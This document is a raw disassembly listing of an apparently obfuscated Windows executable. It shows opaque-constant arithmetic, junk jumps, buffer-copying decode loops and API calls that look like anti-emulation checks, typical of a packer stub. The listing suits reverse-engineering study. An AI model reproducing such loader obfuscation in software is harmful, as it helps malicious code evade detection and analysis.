0x00401000:	pushl	%ebp	; from: 0x0041f02c(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	jmp	0x00401312	; targets: 0x00401312(MAY)
0x00401312:	subl	$0x28, %esp	; from: 0x00401003(MAY)
0x00401315:	pushl	%esi
0x00401316:	movl	$0x345f3ee8, -40(%ebp)
0x0040131d:	movl	$0xdedbe5ac, %eax
0x00401322:	movl	%eax, -36(%ebp)
0x00401325:	movl	$0x345f3eec, -32(%ebp)
0x0040132c:	movl	%eax, -28(%ebp)
0x0040132f:	movl	$0x3daf, -8(%ebp)
0x00401336:	movl	-8(%ebp), %eax
0x00401339:	xorl	$0x4a98, %eax
0x0040133e:	orl	$0x3564, %eax
0x00401343:	shrl	%eax
0x00401345:	addl	$0x3ebf, %eax
0x0040134a:	orl	$0x71f6, %eax
0x0040134f:	movl	%eax, -28(%ebp)
0x00401352:	movl	$0x7868, -20(%ebp)
0x00401359:	movl	$0x2955, -16(%ebp)
0x00401360:	movl	$0x2d5e, -12(%ebp)
0x00401367:	movl	$0x2, -8(%ebp)
0x0040136e:	movl	-8(%ebp), %ecx
0x00401371:	movl	-12(%ebp), %eax
0x00401374:	xorl	%edx, %edx
0x00401376:	jmp	0x00401685	; targets: 0x00401685(MAY)
0x00401685:	divl	%ecx, %eax	; from: 0x00401376(MAY)
0x00401687:	movl	-16(%ebp), %ecx
0x0040168a:	subl	%ecx, %eax
0x0040168c:	movl	-20(%ebp), %ecx
0x0040168f:	andl	$0x58af, %eax
0x00401694:	imull	$0x7420, %eax, %eax
0x0040169a:	subl	%ecx, %eax
0x0040169c:	movl	-28(%ebp), %ecx
0x0040169f:	cmpl	%eax, %ecx
0x004016a1:	ja	0x00404618	; targets: 0x004016a7(MAY), 0x00404618(MAY)
0x004016a7:	movb	0x0042f666, %al	; from: 0x004016a1(MAY)
0x004016ac:	movb	0x0042f665, %cl
0x004016b2:	jmp	0x004019c1	; targets: 0x004019c1(MAY)
0x004019c1:	addb	%cl, %al	; from: 0x004016b2(MAY)
0x004019c3:	movb	0x0042f664, %cl
0x004019c9:	movzbl	%al, %eax
0x004019cc:	movzbl	%cl, %ecx
0x004019cf:	cltd	
0x004019d0:	idivl	%ecx, %eax
0x004019d2:	jmp	0x00401ce1	; targets: 0x00401ce1(MAY)
0x00401ce1:	movb	$0x4b, %cl	; from: 0x004019d2(MAY)
0x00401ce3:	jmp	0x00401ff2	; targets: 0x00401ff2(MAY)
0x00401ff2:	imulb	%cl, %al	; from: 0x00401ce3(MAY)
0x00401ff4:	movb	$0xffffffe6, %cl
0x00401ff6:	xorl	$0xe, %eax
0x00401ff9:	movb	%al, -5(%ebp)
0x00401ffc:	movb	$0xffffffe4, -2(%ebp)
0x00402000:	movb	$0x6d, -1(%ebp)
0x00402004:	movb	-1(%ebp), %al
0x00402007:	imulb	%cl, %al
0x00402009:	movb	0x0042f667, %cl
0x0040200f:	xorb	%cl, %al
0x00402011:	movb	-2(%ebp), %cl
0x00402014:	orb	%al, %cl
0x00402016:	movb	-5(%ebp), %al
0x00402019:	cmpb	%cl, %al
0x0040201b:	je	0x00404618	; targets: 0x00402021(MAY), 0x00404618(MAY)
0x00402021:	movl	$0x5049, -32(%ebp)	; from: 0x0040201b(MAY)
0x00402028:	pushl	$0x135b
0x0040202d:	movl	$0x7bc8, -28(%ebp)
0x00402034:	movl	-32(%ebp), %eax
0x00402037:	movl	-28(%ebp), %ecx
0x0040203a:	pushl	$0x75fc
0x0040203f:	pushl	%ecx
0x00402040:	pushl	%eax
0x00402041:	call	0x0041ee41	; targets: 0x0041ee41(MAY)
0x00402046:	movl	0x0042f668, %ecx	; from: 0x0041eeb6(MAY)
0x0040204c:	movl	0x0042f66c, %esi
0x00402052:	pushl	$0x2182a8e
0x00402057:	pushl	$0x1c7cc0d
0x0040205c:	xorl	%esi, %edx
0x0040205e:	jmp	0x0040236d	; targets: 0x0040236d(MAY)
0x0040236d:	xorl	%ecx, %eax	; from: 0x0040205e(MAY)
0x0040236f:	jmp	0x0040267e	; targets: 0x0040267e(MAY)
0x0040267e:	pushl	%edx	; from: 0x0040236f(MAY)
0x0040267f:	pushl	%eax
0x00402680:	call	0x0041ee41	; targets: 0x0041ee41(MAY)
0x00402685:	orl	$0xa26, %eax	; from: 0x0041eeb6(MAY)
0x0040268a:	movl	%eax, -32(%ebp)
0x0040268d:	orl	$0x2055, %edx
0x00402693:	jmp	0x004029a2	; targets: 0x004029a2(MAY)
0x004029a2:	movl	%edx, -28(%ebp)	; from: 0x00402693(MAY)
0x004029a5:	movl	$0x7889, %eax
0x004029aa:	movw	%ax, -8(%ebp)
0x004029ae:	jmp	0x00402cbd	; targets: 0x00402cbd(MAY)
0x00402cbd:	movw	0x0042f678, %ax	; from: 0x004029ae(MAY)
0x00402cc3:	movzwl	%ax, %ecx
0x00402cc6:	movw	0x0042f674, %ax
0x00402ccc:	movzwl	%ax, %eax
0x00402ccf:	cltd	
0x00402cd0:	idivl	%ecx, %eax
0x00402cd2:	movzwl	%ax, %ecx
0x00402cd5:	jmp	0x00402fe4	; targets: 0x00402fe4(MAY)
0x00402fe4:	movw	0x0042f670, %ax	; from: 0x00402cd5(MAY)
0x00402fea:	movzwl	%ax, %eax
0x00402fed:	xorl	%ecx, %eax
0x00402fef:	jmp	0x004032fe	; targets: 0x004032fe(MAY)
0x004032fe:	movzwl	-8(%ebp), %ecx	; from: 0x00402fef(MAY)
0x00403302:	orl	%eax, %ecx
0x00403304:	movw	%cx, -8(%ebp)
0x00403308:	movl	0x0042f684, %eax
0x0040330d:	cmpl	$0x2809a89a, %eax
0x00403312:	jne	0x00404618	; targets: 0x00403318(MAY)
0x00403318:	movl	-40(%ebp), %eax	; from: 0x00403312(MAY)
0x0040331b:	movl	-36(%ebp), %ecx
0x0040331e:	movl	-40(%ebp), %edx
0x00403321:	movl	-36(%ebp), %esi
0x00403324:	jmp	0x00403633	; targets: 0x00403633(MAY)
0x00403633:	shrdl	$0x2, %ecx, %eax	; from: 0x00403324(MAY)
0x00403637:	shll	$0x1e, %edx
0x0040363a:	movl	0x0042f268, %edx
0x00403640:	movl	0x1a8(%edx), %edx
0x00403646:	shrl	$0x2, %ecx
0x00403649:	movl	$0xd17cfba, %ecx
0x0040364e:	xorl	%ecx, %eax
0x00403650:	xorl	%esi, %esi
0x00403652:	jmp	0x00403961	; targets: 0x00403961(MAY)
0x00403961:	orl	%esi, %eax	; from: 0x00403652(MAY)
0x00403963:	movl	%eax, (%edx)
0x00403965:	jmp	0x00403c74	; targets: 0x00403c74(MAY)
0x00403c74:	movl	-40(%ebp), %eax	; from: 0x00403965(MAY)
0x00403c77:	movl	-36(%ebp), %edx
0x00403c7a:	shrdl	$0x2, %edx, %eax
0x00403c7e:	shrl	$0x2, %edx
0x00403c81:	movl	-40(%ebp), %edx
0x00403c84:	movl	-36(%ebp), %esi
0x00403c87:	jmp	0x00403f96	; targets: 0x00403f96(MAY)
0x00403f96:	xorl	%ecx, %eax	; from: 0x00403c87(MAY)
0x00403f98:	xorl	%esi, %esi
0x00403f9a:	orl	%esi, %eax
0x00403f9c:	movl	%eax, 0x0042f684
0x00403fa1:	movb	$0xffffffa6, -5(%ebp)
0x00403fa5:	movb	-5(%ebp), %al
0x00403fa8:	subb	$0x6, %al
0x00403faa:	orb	$0xfffffff0, %al
0x00403fac:	jmp	0x004042bb	; targets: 0x004042bb(MAY)
0x004042bb:	shll	$0x1e, %edx	; from: 0x00403fac(MAY)
0x004042be:	movb	%al, -5(%ebp)
0x004042c1:	movb	0x0042f67c, %dl
0x004042c7:	movb	0x0042f67b, %al
0x004042cc:	xorb	$0xffffffa4, %dl
0x004042cf:	imulb	%dl, %al
0x004042d1:	movb	$0xffffff8f, %dl
0x004042d3:	imulb	%dl, %al
0x004042d5:	movb	0x0042f67a, %dl
0x004042db:	andb	%al, %dl
0x004042dd:	movb	-5(%ebp), %al
0x004042e0:	cmpb	%dl, %al
0x004042e2:	jb	0x00404618	; targets: 0x004042e8(MAY)
0x004042e8:	movl	-40(%ebp), %eax	; from: 0x004042e2(MAY)
0x004042eb:	movl	-36(%ebp), %edx
0x004042ee:	shrdl	$0x2, %edx, %eax
0x004042f2:	xorl	%ecx, %eax
0x004042f4:	movl	-40(%ebp), %ecx
0x004042f7:	shrl	$0x2, %edx
0x004042fa:	movl	-36(%ebp), %edx
0x004042fd:	xorl	%edx, %edx
0x004042ff:	shll	$0x1e, %ecx
0x00404302:	jmp	0x00404611	; targets: 0x00404611(MAY)
0x00404611:	orl	%edx, %eax	; from: 0x00404302(MAY)
0x00404613:	movl	%eax, 0x0042f370
0x00404618:	popl	%esi	; from: 0x004016a1(MAY), 0x0040201b(MAY)
0x00404619:	leave	
0x0040461a:	ret	; targets: 0x0041f031(MAY)

0x00415287:	pushl	%ebp	; from: 0x00420b85(MAY)
0x00415288:	movl	%esp, %ebp
0x0041528a:	subl	$0xac, %esp
0x00415290:	pushl	%ebx
0x00415291:	pushl	%esi
0x00415292:	movl	$0x7dea, -8(%ebp)
0x00415299:	xorl	%esi, %esi
0x0041529b:	incl	%esi
0x0041e533:	pushl	%ebp	; from: 0x0041f0b6(MAY)
0x0041e534:	movl	%esp, %ebp
0x0041e536:	subl	$0x1c, %esp
0x0041e539:	movl	$0x499, -4(%ebp)
0x0041e540:	movl	$0x27dc, -12(%ebp)
0x0041e547:	movl	$0x7671, -8(%ebp)
0x0041e54e:	movl	-4(%ebp), %ecx
0x0041e551:	addl	$0x309f, %ecx
0x0041e557:	orl	$0x542c, %ecx
0x0041e55d:	xorl	$0x145a, %ecx
0x0041e563:	shrl	%ecx
0x0041e565:	pushl	%esi
0x0041e566:	addl	$0x1efe, %ecx
0x0041e56c:	pushl	%edi
0x0041e56d:	movl	$0x6d13, -4(%ebp)	; from: 0x0041e601(MAY)
0x0041e574:	movl	0x0042f620, %eax
0x0041e579:	imull	$0xfffff264, %eax, %eax
0x0041e57f:	andl	$0x531c, %eax
0x0041e584:	movl	%ecx, %edx
0x0041e586:	subl	%eax, %edx
0x0041e588:	movl	0x8(%ebp), %eax
0x0041e58b:	leal	-46681(%edx,%eax), %eax
0x0041e592:	movl	0x0042f61c, %edx
0x0041e598:	addl	%edx, %eax
0x0041e59a:	movl	-4(%ebp), %edx
0x0041e59d:	movl	0x0042f624, %esi
0x0041e5a3:	movb	(%eax), %al
0x0041e5a5:	andl	$0x5ce, %edx
0x0041e5ab:	xorl	$0x7a8f, %edx
0x0041e5b1:	imull	%esi, %edx
0x0041e5b4:	movl	0x0042f268, %esi
0x0041e5ba:	movl	0x1cc(%esi), %esi
0x0041e5c0:	subl	%edx, %esi
0x0041e5c2:	movb	%al, 0x593294c(%esi,%ecx)
0x0041e5c9:	movl	-8(%ebp), %eax
0x0041e5cc:	addl	-12(%ebp), %eax
0x0041e5cf:	pushl	$0x1a
0x0041e5d1:	imull	$0x2cd7, %eax, %eax
0x0041e5d7:	orl	$0x1c8c, %eax
0x0041e5dc:	xorl	$0x1bba3eae, %eax
0x0041e5e1:	addl	%eax, %ecx
0x0041e5e3:	movl	0x0042f618, %eax
0x0041e5e8:	movl	0x0042f614, %edx
0x0041e5ee:	xorl	%edx, %eax
0x0041e5f0:	orl	$0x509b, %eax
0x0041e5f5:	xorl	%edx, %edx
0x0041e5f7:	popl	%esi
0x0041e5f8:	divl	%esi, %eax
0x0041e5fa:	addl	$0x4ad3, %eax
0x0041e5ff:	cmpl	%eax, %ecx
0x0041e601:	jne	0x0041e56d	; targets: 0x0041e56d(MAY), 0x0041e607(MAY)
0x0041e607:	movl	$0x59f0, -28(%ebp)	; from: 0x0041e601(MAY)
0x0041e60e:	movl	$0x7953, -24(%ebp)
0x0041e615:	movl	$0x1c5b, -20(%ebp)
0x0041e61c:	movl	$0x7017, -16(%ebp)
0x0041e623:	movl	0x0042f62c, %eax
0x0041e628:	addl	$0x1599, %eax
0x0041e62d:	pushl	$0x3
0x0041e62f:	popl	%ecx
0x0041e630:	xorl	$0x74d6, %eax
0x0041e635:	xorl	%edx, %edx
0x0041e637:	divl	%ecx, %eax
0x0041e639:	movl	0x0042f628, %ecx
0x0041e63f:	pushl	%ebx
0x0041e640:	imull	%eax, %ecx
0x0041e643:	andl	$0x22fc, %ecx
0x0041e649:	addl	$0x1a4b, %ecx
0x0041e64f:	movl	$0x451e, 0x8(%ebp)	; from: 0x0041e702(MAY)
0x0041e656:	movl	$0x4ee6, -4(%ebp)
0x0041e65d:	movl	$0x2929, -8(%ebp)
0x0041e664:	movl	$0x552, -12(%ebp)
0x0041e66b:	movl	0x8(%ebp), %eax
0x0041e66e:	movl	0x0042f63c, %esi
0x0041e674:	addl	$0x403b, %eax
0x0041e679:	orl	$0x4c44, %eax
0x0041e67e:	xorl	%edx, %edx
0x0041e680:	divl	%esi, %eax
0x0041e682:	movl	0x0042f638, %edx
0x0041e688:	movl	%ecx, %esi
0x0041e68a:	pushl	$0x3
0x0041e68c:	popl	%edi
0x0041e68d:	addl	$0x6a54, %eax
0x0041e692:	andl	%eax, %edx
0x0041e694:	movl	0x0042f640, %eax
0x0041e699:	xorl	$0x2b59, %edx
0x0041e69f:	subl	%edx, %esi
0x0041e6a1:	xorl	%edx, %edx
0x0041e6a3:	divl	%edi, %eax
0x0041e6a5:	movl	-12(%ebp), %edx
0x0041e6a8:	addl	0xc(%ebp), %esi
0x0041e6ab:	andl	%eax, %edx
0x0041e6ad:	movl	-8(%ebp), %eax
0x0041e6b0:	orl	%eax, %edx
0x0041e6b2:	movl	0x0042f268, %eax
0x0041e6b7:	movl	0x1d0(%eax), %eax
0x0041e6bd:	subl	%edx, %eax
0x0041e6bf:	movl	-4(%ebp), %edx
0x0041e6c2:	movb	(%esi), %bl
0x0041e6c4:	leal	-24536(%eax,%ecx), %eax
0x0041e6cb:	movb	%bl, (%edx,%eax)
0x0041e6ce:	movl	-16(%ebp), %eax
0x0041e6d1:	movl	-20(%ebp), %edx
0x0041e6d4:	andl	$0x1b00, %eax
0x0041e6d9:	imull	%edx, %eax
0x0041e6dc:	leal	-29732863(%ecx,%eax), %ecx
0x0041e6e3:	movl	-24(%ebp), %eax
0x0041e6e6:	movl	-28(%ebp), %edx
0x0041e6e9:	orl	%edx, %eax
0x0041e6eb:	movl	0x0042f630, %edx
0x0041e6f1:	subl	%edx, %eax
0x0041e6f3:	movl	0x0042f634, %edx
0x0041e6f9:	addl	$0xffff9d5a, %eax
0x0041e6fe:	addl	%eax, %edx
0x0041e700:	cmpl	%edx, %ecx
0x0041e702:	jne	0x0041e64f	; targets: 0x0041e64f(MAY), 0x0041e708(MAY)
0x0041e708:	movl	$0x377c, -28(%ebp)	; from: 0x0041e702(MAY)
0x0041e70f:	movl	0x0042f64c, %eax
0x0041e714:	movl	0x0042f648, %ecx
0x0041e71a:	imull	%ecx, %eax
0x0041e71d:	movl	0x0042f644, %ecx
0x0041e723:	movl	0x0042f654, %esi
0x0041e729:	xorl	%eax, %ecx
0x0041e72b:	movl	0x0042f650, %eax
0x0041e730:	imull	$0x6da8, %ecx, %ecx
0x0041e736:	xorl	%edx, %edx
0x0041e738:	subl	$0x57fc2052, %ecx
0x0041e73e:	divl	%esi, %eax
0x0041e740:	movl	$0x2d46d183, %esi
0x0041e745:	popl	%ebx
0x0041e746:	jmp	0x0041e7e0	; targets: 0x0041e7e0(MAY)
0x0041e74b:	movl	$0x298c, 0xc(%ebp)	; from: 0x0041e7ea(MAY)
0x0041e752:	movl	$0x331a, 0x8(%ebp)
0x0041e759:	movl	0x8(%ebp), %eax
0x0041e75c:	movl	0xc(%ebp), %edx
0x0041e75f:	andl	$0x52d1, %eax
0x0041e764:	addl	$0x5542, %eax
0x0041e769:	imull	%edx, %eax
0x0041e76c:	movl	0x0042f660, %edx
0x0041e772:	imull	$0x5780, %eax, %eax
0x0041e778:	movl	0x0042f268, %edi
0x0041e77e:	movl	0x1d4(%edi), %edi
0x0041e784:	subl	$0x6fb, %edx
0x0041e78a:	andl	$0xc14, %edx
0x0041e790:	orl	$0x40aa, %edx
0x0041e796:	addl	%ecx, %eax
0x0041e798:	xorl	$0x5148, %edx
0x0041e79e:	subl	%edx, %edi
0x0041e7a0:	movl	0x10(%ebp), %edx
0x0041e7a3:	movb	-900263414(%eax,%edx), %al
0x0041e7aa:	movb	%al, (%edi,%ecx)
0x0041e7ad:	movl	0x0042f65c, %eax
0x0041e7b2:	movl	0x0042f658, %edx
0x0041e7b8:	subl	$0x511a, %eax
0x0041e7bd:	xorl	$0x46da, %eax
0x0041e7c2:	imull	%eax, %edx
0x0041e7c5:	movl	-28(%ebp), %eax
0x0041e7c8:	movl	0x0042f654, %edi
0x0041e7ce:	addl	%edx, %eax
0x0041e7d0:	xorl	$0xf7bf60ed, %eax
0x0041e7d5:	addl	%eax, %ecx
0x0041e7d7:	movl	0x0042f650, %eax
0x0041e7dc:	xorl	%edx, %edx
0x0041e7de:	divl	%edi, %eax
0x0041e7e0:	imull	$0xcf8b424, %eax, %eax	; from: 0x0041e746(MAY)
0x0041e7e6:	subl	%esi, %eax
0x0041e7e8:	cmpl	%eax, %ecx
0x0041e7ea:	jbe	0x0041e74b	; targets: 0x0041e7f0(MAY), 0x0041e74b(MAY)
0x0041e7f0:	popl	%edi	; from: 0x0041e7ea(MAY)
0x0041e7f1:	popl	%esi
0x0041e7f2:	leave	
0x0041e7f3:	ret	$0xc	; targets: 0x0041f0bb(MAY)

0x0041ee41:	movzwl	0x00421455, %eax	; from: 0x00402680(MAY), 0x00402041(MAY)
0x0041ee48:	adcl	%eax, 0x0042134d
0x0041ee4e:	movl	0x8(%esp), %eax
0x0041ee52:	andl	0x0042135d, %ecx
0x0041ee58:	movl	0x10(%esp), %ecx
0x0041ee5c:	orl	%eax, %ecx
0x0041ee5e:	movl	$0x22f6, 0x00421671
0x0041ee68:	movl	0xc(%esp), %ecx
0x0041ee6c:	jne	0x0041ee85	; targets: 0x0041ee85(MAY)
0x0041ee85:	incl	0x004213ad	; from: 0x0041ee6c(MAY)
0x0041ee8b:	pushl	%ebx
0x0041ee8c:	movzbl	0x0042143d, %ebx
0x0041ee93:	sbbl	0x004212dd, %ebx
0x0041ee99:	movl	%ebx, 0x0042143d
0x0041ee9f:	mull	%ecx, %eax
0x0041eea1:	movl	%eax, %ebx
0x0041eea3:	movl	0x8(%esp), %eax
0x0041eea7:	mull	0x14(%esp), %eax
0x0041eeab:	addl	%eax, %ebx
0x0041eead:	movl	0x8(%esp), %eax
0x0041eeb1:	mull	%ecx, %eax
0x0041eeb3:	addl	%ebx, %edx
0x0041eeb5:	popl	%ebx
0x0041eeb6:	ret	$0x10	; targets: 0x00402685(MAY), 0x00402046(MAY)


start:
0x0041efb4:	pushl	%ebp
0x0041efb5:	movl	%esp, %ebp
0x0041efb7:	andl	$0xfffffff8, %esp
0x0041efba:	subl	$0x20c, %esp
0x0041efc0:	pushl	%ebx
0x0041efc1:	pushl	%esi
0x0041efc2:	pushl	%edi
0x0041efc3:	pushl	$0x6
0x0041efc5:	popl	%esi
0x0041efc6:	movl	0x0042f04c, %eax	; from: 0x0041f009(MAY)
0x0041efcb:	incl	%eax
0x0041efcc:	pushl	%eax
0x0041efcd:	call	strlen@msvcrt.dll	; targets: 0xff000010(MAY)
0x0041efd3:	movl	%eax, %edi
0x0041efd5:	movl	0x0042f07c, %eax
0x0041efda:	popl	%ecx
0x0041efdb:	addl	$0x2, %eax
0x0041efde:	pushl	%eax
0x0041efdf:	call	wcslen@msvcrt.dll	; targets: 0xff000140(MAY)
0x0041efe5:	popl	%ecx
0x0041efe6:	cmpl	%edi, %eax
0x0041efe8:	je	0x0041f60a	; targets: 0x0041f60a(MAY), 0x0041efee(MAY)
0x0041efee:	pushl	0x0042f07c	; from: 0x0041efe8(MAY)
0x0041eff4:	call	RemoveDirectoryW@kernel32.dll	; targets: 0xff000080(MAY)
0x0041effa:	testl	%eax, %eax
0x0041effc:	jne	0x0041f5f0	; targets: 0x0041f002(MAY), 0x0041f5f0(MAY)
0x0041f002:	incl	%esi	; from: 0x0041effc(MAY)
0x0041f003:	cmpl	$0x20b, %esi
0x0041f009:	jb	0x0041efc6	; targets: 0x0041f00f(MAY), 0x0041efc6(MAY)
0x0041f00f:	movl	$0x345f3ee8, 0x18(%esp)	; from: 0x0041f009(MAY)
0x0041f017:	movl	$0xdedbe5ac, %ebx
0x0041f01c:	movl	%ebx, 0x1c(%esp)
0x0041f020:	movl	$0x345f3eec, 0x38(%esp)
0x0041f028:	movl	%ebx, 0x3c(%esp)
0x0041f02c:	call	0x00401000	; targets: 0x00401000(MAY)
0x0041f031:	leal	0x60(%esp), %eax	; from: 0x0040461a(MAY)
0x0041f035:	movl	%eax, 0xb4(%esp)
0x0041f03c:	leal	0x5c(%esp), %eax
0x0041f040:	movl	%eax, 0x48(%esp)
0x0041f044:	movl	0x0042f268, %eax
0x0041f049:	movl	0x1d8(%eax), %eax
0x0041f04f:	movl	(%eax), %eax
0x0041f051:	movl	%eax, %ecx
0x0041f053:	notl	%eax
0x0041f055:	shll	$0x1e, %eax
0x0041f058:	movl	$0xdb6988ff, %edi
0x0041f05d:	xorl	%edi, %ecx
0x0041f05f:	shrl	$0x2, %ecx
0x0041f062:	orl	%eax, %ecx
0x0041f064:	movl	0x48(%esp), %eax
0x0041f068:	movl	%ecx, (%eax)
0x0041f06a:	movl	0x0042f268, %ecx
0x0041f070:	movl	0x19c(%ecx), %ecx
0x0041f076:	movl	(%ecx), %ecx
0x0041f078:	movl	$0x345f3ef8, %eax
0x0041f07d:	movl	%eax, 0x210(%esp)
0x0041f084:	movl	%ebx, 0x214(%esp)
0x0041f08b:	movl	%ecx, 0xf8(%esp)
0x0041f092:	movl	%eax, 0x20(%esp)
0x0041f096:	movl	%ebx, 0x24(%esp)
0x0041f09a:	movl	%eax, 0x20(%esp)
0x0041f09e:	movl	%ebx, 0x24(%esp)
0x0041f0a2:	movl	%eax, 0x20(%esp)
0x0041f0a6:	leal	0x10(%ebp), %eax
0x0041f0a9:	pushl	%eax
0x0041f0aa:	leal	0xc(%ebp), %eax
0x0041f0ad:	pushl	%eax
0x0041f0ae:	leal	0x8(%ebp), %eax
0x0041f0b1:	movl	%ebx, 0x2c(%esp)
0x0041f0b5:	pushl	%eax
0x0041f0b6:	call	0x0041e533	; targets: 0x0041e533(MAY)
0x0041f0bb:	movl	0x0042f0ec, %ecx	; from: 0x0041e7f3(MAY)
0x0041f0c1:	movl	0x0042f0ec, %eax
0x0041f0c6:	shll	$0x2, %eax
0x0041f0c9:	shrl	$0x1e, %ecx
0x0041f0cc:	orl	%ecx, %eax
0x0041f0ce:	movl	0xb4(%esp), %ecx
0x0041f0d5:	xorl	%edi, %eax
0x0041f0d7:	movl	%eax, (%ecx)
0x0041f0d9:	movl	0x50(%esp), %ecx
0x0041f0dd:	leal	0x50(%esp), %eax
0x0041f0e1:	movl	%eax, 0x64(%esp)
0x0041f0e5:	leal	0x64(%esp), %eax
0x0041f0e9:	movl	%eax, 0x1ac(%esp)
0x0041f0f0:	movl	0x50(%esp), %eax
0x0041f0f4:	subl	%ecx, %eax
0x0041f0f6:	leal	0x4(%ebp), %ecx
0x0041f0f9:	xorl	%ecx, %eax
0x0041f0fb:	xorl	%ecx, %ecx
0x0041f0fd:	movl	%eax, 0x50(%esp)
0x0041f101:	movl	$0xd17cfba, %esi
0x0041f106:	xorl	%esi, %eax
0x0041f108:	xorl	$0xf7b6f96b, %ecx
0x0041f10e:	shldl	$0x2, %eax, %ecx
0x0041f112:	movl	%ecx, 0x24(%esp)
0x0041f116:	movl	0x18(%esp), %ecx
0x0041f11a:	movl	0x1c(%esp), %edx
0x0041f11e:	shll	$0x2, %eax
0x0041f121:	cmpl	%ecx, %eax
0x0041f123:	jne	0x0041f133	; targets: 0x0041f129(MAY), 0x0041f133(MAY)
0x0041f129:	cmpl	%edx, 0x24(%esp)	; from: 0x0041f123(MAY)
0x0041f12d:	je	0x00420b9d	; targets: 0x00420b9d(MAY), 0x0041f133(MAY)
0x0041f133:	movl	0x60(%esp), %eax	; from: 0x0041f12d(MAY), 0x0041f123(MAY)
0x0041f137:	cmpl	$0xdb6988fb, %eax
0x0041f13c:	je	0x0041f18b	; targets: 0x0041f18b(MAY), 0x0041f142(MAY)
0x0041f142:	movl	0x18(%esp), %edx	; from: 0x0041f13c(MAY)
0x0041f146:	movl	0x1c(%esp), %eax
0x0041f14a:	xorl	%ebx, %eax
0x0041f14c:	xorl	$0x345f3eeb, %edx
0x0041f152:	shrdl	$0x2, %eax, %edx
0x0041f156:	shrl	$0x2, %eax
0x0041f159:	movl	%eax, 0x24(%esp)
0x0041f15d:	movl	0x18(%esp), %eax
0x0041f161:	movl	0x1c(%esp), %ecx
0x0041f165:	shll	$0x1e, %eax
0x0041f168:	orl	0x24(%esp), %eax
0x0041f16c:	xorl	%ecx, %ecx
0x0041f16e:	movl	%eax, 0x24(%esp)
0x0041f172:	movl	0x5c(%esp), %eax
0x0041f176:	orl	%edx, %ecx
0x0041f178:	cltd	
0x0041f179:	cmpl	%eax, %ecx
0x0041f17b:	jne	0x00420b9d	; targets: 0x0041f181(MAY)
0x0041f181:	cmpl	%edx, 0x24(%esp)	; from: 0x0041f17b(MAY)
0x0041f185:	jne	0x00420b9d	; targets: 0x0041f18b(MAY)
0x0041f18b:	movl	$0x42f304, 0xe0(%esp)	; from: 0x0041f185(MAY), 0x0041f13c(MAY)
0x0041f196:	movl	$0x42f2fc, 0xe8(%esp)
0x0041f1a1:	movl	0xf8(%esp), %eax
0x0041f1a8:	movl	0xf8(%esp), %eax
0x0041f1af:	xorl	%ecx, %ecx
0x0041f1b1:	xorl	%esi, %eax
0x0041f1b3:	xorl	$0xf7b6f96b, %ecx
0x0041f1b9:	shldl	$0x2, %eax, %ecx
0x0041f1bd:	movl	%ecx, 0x24(%esp)
0x0041f1c1:	movl	0x18(%esp), %ecx
0x0041f1c5:	movl	0x1c(%esp), %edx
0x0041f1c9:	shll	$0x2, %eax
0x0041f1cc:	cmpl	%eax, %ecx
0x0041f1ce:	jne	0x00420b46	; targets: 0x00420b46(MAY)
0x0041f5f0:	pushl	$0x7566754	; from: 0x0041effc(MAY)
0x0041f5f5:	pushl	$0x87657654
0x0041f5fa:	pushl	$0x86776565
0x0041f5ff:	pushl	$0x87567654
0x0041f604:	call	GetModuleBaseNameA@psapi.dll	; targets: 0xff0000c0(MAY)
0x0041f60a:	xorl	%eax, %eax	; from: 0x0041efe8(MAY)
0x0041f60c:	jmp	0x00420bc0	; targets: 0x00420bc0(MAY)
0x00420b46:	movl	0xe8(%esp), %eax	; from: 0x0041f1ce(MAY)
0x00420b4d:	movl	0xe8(%esp), %ecx
0x00420b54:	movl	(%eax), %eax
0x00420b56:	cmpl	(%ecx), %eax
0x00420b58:	jne	0x00420b9d	; targets: 0x00420b5e(MAY), 0x00420b9d(MAY)
0x00420b5e:	movl	0xe0(%esp), %eax	; from: 0x00420b58(MAY)
0x00420b65:	movl	0xe0(%esp), %ecx
0x00420b6c:	movl	(%eax), %eax
0x00420b6e:	cmpl	(%ecx), %eax
0x00420b70:	jne	0x00420b9d	; targets: 0x00420b76(MAY), 0x00420b9d(MAY)
0x00420b76:	leal	0x1ac(%esp), %eax	; from: 0x00420b70(MAY)
0x00420b7d:	pushl	%eax
0x00420b7e:	leal	0x108(%esp), %edi
0x00420b85:	call	0x00415287	; targets: 0x00415287(MAY)
0x00420b9d:	leal	0x104(%esp), %eax	; from: 0x0041f12d(MAY), 0x00420b58(MAY), 0x00420b70(MAY)
0x00420ba4:	pushl	%eax
0x00420ba5:	leal	0x64(%esp), %eax
0x00420ba9:	pushl	%eax
0x00420baa:	pushl	0x58(%esp)
0x00420bae:	leal	0x68(%esp), %eax
0x00420bb2:	call	0x00420bc9	; targets: 0x00420bc9(MAY)
0x00420bc0:	popl	%edi	; from: 0x0041f60c(MAY)
0x00420bc1:	popl	%esi
0x00420bc2:	popl	%ebx
0x00420bc3:	movl	%ebp, %esp
0x00420bc5:	popl	%ebp
0x00420bc6:	ret	$0xc	; targets: 0xfee70000(MAY)

0x00420bc9:	pushl	%ebp	; from: 0x00420bb2(MAY)
0x00420bca:	movl	%esp, %ebp
0x00420bcc:	subl	$0x10, %esp
0x00420bcf:	pushl	%ebx
0x00420bd0:	pushl	%esi
0x00420bd1:	addl	%ebx, %esi
0x00420bd3:	movl	0x004214bd, %ebx
0x00420bd9:	xorl	%esi, %esi
0x00420bdb:	orl	0x004215dd, %esi
0x00420be1:	subl	%esi, %ebx
0x00420be3:	imull	(%ebx,%esi), %ebx
0x00420be7:	movzwl	0x00421669, %ebx
0x00420bee:	andl	%ebx, 0x00421719
0x00420bf4:	subl	%edi, 0x00421481
0x00420bfa:	orl	$0x73a1, 0x00421641
0x00420c04:	incl	0x00421661
